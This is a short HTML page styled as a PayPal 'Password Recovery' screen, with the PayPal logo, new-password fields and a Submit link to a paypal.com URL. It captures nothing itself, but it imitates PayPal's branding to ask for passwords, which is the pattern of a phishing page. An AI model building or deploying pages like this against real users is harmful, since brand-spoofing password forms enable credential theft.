<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <script src="script.js" defer></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap');
        </style>
    <title>Password Recovery</title>
</head>
<body>
    <div class="image-container">
        <img src="PayPal-Logo.png" alt="PayPal Logo">
    </div>
    <div class="container">
        <h1>Password Recovery</h1>
        <p>Please enter your new password to change it.</p>
        
            <div class="form-group">
                <label for="newpass">New Password:</label>
                <input type="password" id="newpass" name="newpass" required>
                <label for="renewpass">Confirm Password:</label>
                <input type="password" id="renewpass" name="renewpass" required>
            </div>
            
            <a href="https://www.paypal.com/authflow/password-re" id="clickableLink"><button type="submit">Submit</button></a>
    </div>
</body>
</html>
